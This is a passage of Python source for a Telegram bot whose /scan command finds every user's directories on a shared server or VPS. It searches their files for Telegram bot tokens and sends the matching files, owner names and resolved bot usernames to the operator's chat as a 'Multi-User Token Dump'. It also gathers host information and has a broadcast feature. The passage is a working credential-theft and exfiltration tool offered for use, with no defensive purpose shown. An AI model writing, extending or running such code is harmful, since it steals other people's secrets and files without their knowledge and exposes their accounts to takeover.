        save_cfg(cfg)
        await update.message.reply_text(f"✅ Added: <code>{h(nd)}</code>", parse_mode="HTML")
    else:
        await update.message.reply_text("ℹ️ Already list mein.")


async def stopscan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    if not is_scan_running(context.application):
        await update.message.reply_text("ℹ️ Koi scan chal nahi raha.")
        return
    request_stop(context.application)
    await update.message.reply_text("⛔ Stop signal bheja!")


# ═════════════════════════════════════════
#  MAIN SCAN — MULTI-USER
# ═════════════════════════════════════════

async def scan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Multi-user scan:
      1. Server pe SAARE users ke folders auto-discover
      2. Har user ki token wali files
      3. Owner name ke saath bhejo
    """
    uid = update.effective_user.id
    if not is_authenticated(uid, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    if is_scan_running(context.application):
        await update.message.reply_text("⚠️ Scan chal raha hai. /stopscan.")
        return

    target_chat = uid
    start_scan_session(context.application, uid)

    msg = await update.message.reply_text("🔍 Platform detect...")
    plat = detect_platform()

    # ── VPS info ────────────────────────────────────────────
    if plat.get("is_vps"):
        try:
            vps_info = await asyncio.to_thread(collect_vps_info)
            await context.bot.send_message(
                chat_id=uid,
                text=f"🖥️ <b>VPS / Server Info</b>\n\n{vps_info}",
                parse_mode="HTML")
        except Exception as e:
            log.error(f"VPS DM: {e}")

    await step(msg,
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n"
        f"🔎 Server pe saare users dhoondh raha hoon...")

    # ── Auto-discover saare user dirs ───────────────────────
    dirs_with_owner = await asyncio.to_thread(discover_all_user_dirs)

    if not dirs_with_owner:
        await step(msg, "⚠️ Koi user folder nahi mila. /adddir karo.")
        end_scan_session(context.application)
        return

    # ── Owners ki summary ──────────────────────────────────
    owners = set(o for _, o in dirs_with_owner)
    await step(msg,
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n\n"
        f"👥 Users: <b>{len(owners)}</b>\n"
        f"📁 Total dirs: <b>{len(dirs_with_owner)}</b>\n\n"
        f"🔎 Files collect kar raha hoon...")

    # ── Files collect karo (owner ke saath) ────────────────
    all_files, dup_removed, active_dirs = await asyncio.to_thread(
        gather_all_files_multi, dirs_with_owner
    )

    if not all_files:
        await step(msg, "⚠️ Koi user file nahi mili.")
        end_scan_session(context.application)
        return

    # ── Sirf token wali files rakho ────────────────────────
    await step(msg,
        f"📄 User files: <b>{len(all_files)}</b>\n"
        f"👥 Active dirs: <b>{active_dirs}</b>\n"
        f"🗑️ Duplicates removed: <b>{dup_removed}</b>\n\n"
        f"🧪 Token scan ho raha hai...")

    token_files = []   # (path, owner, findings, raw_tokens)

    for i, (fp, owner) in enumerate(all_files, 1):
        if is_stop_requested(context.application):
            await step(msg, f"⛔ Roka! {i}/{len(all_files)}")
            end_scan_session(context.application)
            return

        findings, raw = await asyncio.to_thread(scan_file_for_tokens, fp)
        if findings and raw:
            token_files.append((fp, owner, findings, raw))

        if i % 30 == 0:
            await step(msg,
                f"🧪 Token scan: <b>{i}/{len(all_files)}</b>\n"
                f"🔑 Found: <b>{len(token_files)}</b>")

    if len(token_files) > MAX_TOKEN_FILES:
        token_files = token_files[:MAX_TOKEN_FILES]

    if not token_files:
        await step(msg,
            f"⚠️ <b>Koi token file nahi mili.</b>\n"
            f"Total user files: {len(all_files)}")
        end_scan_session(context.application)
        return

    # Bade files pehle
    def safe_size(p):
        try: return p.stat().st_size
        except OSError: return 0
    token_files.sort(key=lambda x: safe_size(x[0]), reverse=True)

    total = len(token_files)

    # Owners count jinki files mili
    owners_with_tokens = set(o for _, o, _, _ in token_files)

    await step(msg,
        f"✅ <b>{total} token files mili!</b>\n"
        f"👥 Owners: <b>{len(owners_with_tokens)}</b>\n"
        f"🤖 Bot names resolve...")

    # ── Header ──────────────────────────────────────────────
    await send_text(context, target_chat,
        f"{'═'*32}\n{plat['icon']} <b>Multi-User Token Dump</b>\n{'═'*32}\n"
        f"🖥️ <b>{h(plat['name'])}</b>\n"
        f"🔑 Total token files: <code>{total}</code>\n"
        f"👥 Owners: <code>{len(owners_with_tokens)}</code>\n"
        f"📁 Active dirs: <code>{active_dirs}</code>\n"
        f"🗑️ Duplicates removed: <code>{dup_removed}</code>\n"
        f"📏 Real size bytes me\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    sent = failed = 0
    errors = []

    for i, (filepath, owner, findings, raw_tokens) in enumerate(token_files, 1):
        if is_stop_requested(context.application):
            await step(msg, f"⛔ Roka! ✅{sent} ❌{failed}")
            end_scan_session(context.application)
            return

        # Bot names resolve (max 3)
        bot_lines = []
        for j, raw in enumerate(raw_tokens[:3]):
            uname, bname = await resolve_bot_username(raw)
            masked = raw[:8] + ":***..." + raw[-4:]
            if uname:
                bot_lines.append(
                    f"🤖 Bot: <a href=\"https://t.me/{h(uname)}\">@{h(uname)}</a>"
                    + (f" ({h(bname)})" if bname else "")
                )
            else:
                bot_lines.append(f"🔑 Token: <code>{masked}</code> (invalid)")

        bots_text = "\n".join(bot_lines)
        size_str = real_size_str(filepath)

        # File ka actual user (filesystem se)
        fs_owner = _owner_of_path(filepath)

        caption = (
            f"🔑 [{i}/{total}] <code>{h(filepath.name)}</code>\n"
            f"📏 {size_str}\n"
            f"👤 Owner: <b>{h(owner)}</b> (fs: <code>{h(fs_owner)}</code>)\n"
            f"📍 <code>{h(str(filepath))}</code>\n"
            f"\n{bots_text}"
        )

        pct = int(i / total * 100)
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        await step(msg,
            f"📤 Bhej raha hoon...\n"
            f"<code>[{bar}] {pct}%</code>\n"
            f"✅ {sent}  ❌ {failed}\n"
            f"<i>⛔ /stopscan</i>")

        if await send_doc(context, filepath, caption, target_chat):
            sent += 1
        else:
            failed += 1
            errors.append(filepath.name)
        await asyncio.sleep(SEND_DELAY)

    # Summary
    err = ""
    if errors:
        err = "\n\n❌ Failed: " + ", ".join(errors[:5])

    summary = (
        f"{'═'*32}\n✅ <b>Multi-User Scan Complete</b>\n{'═'*32}\n"
        f"👥 Owners scanned: <code>{len(owners)}</code>\n"
        f"📁 Active dirs: <code>{active_dirs}</code>\n"
        f"📄 User files: <code>{len(all_files)}</code>\n"
        f"🔑 Token files: <code>{total}</code>\n"
        f"✅ Sent: <code>{sent}</code>  ❌ Failed: <code>{failed}</code>\n"
        f"🗑️ Duplicates removed: <code>{dup_removed}</code>{err}"
    )
    await send_text(context, target_chat, summary)
    await step(msg, summary)
    end_scan_session(context.application)


async def mycode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    uid = update.effective_user.id
    own = Path(__file__)
    msg = await update.message.reply_text("📤 Code bhej raha hoon...")
    await send_text(context, uid, f"🤖 <b>{h(own.name)}</b>\n📏 {real_size_str(own)}")
    ok = await send_doc(context, own, f"🤖 <code>{h(own.name)}</code>\n📏 {real_size_str(own)}", uid)
    await msg.edit_text("✅ Bhej diya!" if ok else "❌ Error")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🛠 <b>Commands</b>\n\n"
        "/start    — Login\n"
        "/scan     — SAARE users ki token files bhejo\n"
        "/users    — Server pe users list karo\n"
        "/stopscan — Scan roko\n"
        "/checkbot — Admin chats check\n"
        "/mycode   — Bot ka code\n"
        "/info     — Platform info\n"
        "/config   — Config\n"
        "/adddir   — Dir add karo\n"
        "/help     — Help",
        parse_mode="HTML")


# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    if BOT_TOKEN in ("", "APNA_BOT_TOKEN_YAHAN_DAALO"):
        raise SystemExit("❌ BOT_TOKEN set nahi hai!")

    log.info("Bot start...")
    app = Application.builder().token(BOT_TOKEN).build()

    auth_conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={WAIT_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password)]},
        fallbacks=[CommandHandler("start", start)],
        per_user=True, per_chat=True,
    )

    bc_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(broadcast_start, pattern="^bc_start$")],
        states={
            BC_MSG:   [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_msg)],
            BC_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_count)],
        },
        fallbacks=[CommandHandler("cancel", broadcast_cancel)],
        per_user=True, per_chat=True,
    )

    app.add_handler(auth_conv)
    app.add_handler(bc_conv)
    app.add_handler(CommandHandler("help",     help_cmd))
    app.add_handler(CommandHandler("users",    users_cmd))
    app.add_handler(CommandHandler("info",     info_cmd))
    app.add_handler(CommandHandler("config",   config_cmd))
    app.add_handler(CommandHandler("adddir",   adddir_cmd))
    app.add_handler(CommandHandler("scan",     scan_cmd))
    app.add_handler(CommandHandler("stopscan", stopscan_cmd))
    app.add_handler(CommandHandler("mycode",   mycode_cmd))
    app.add_handler(CommandHandler("checkbot", checkbot_cmd))

    log.info("Ready!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()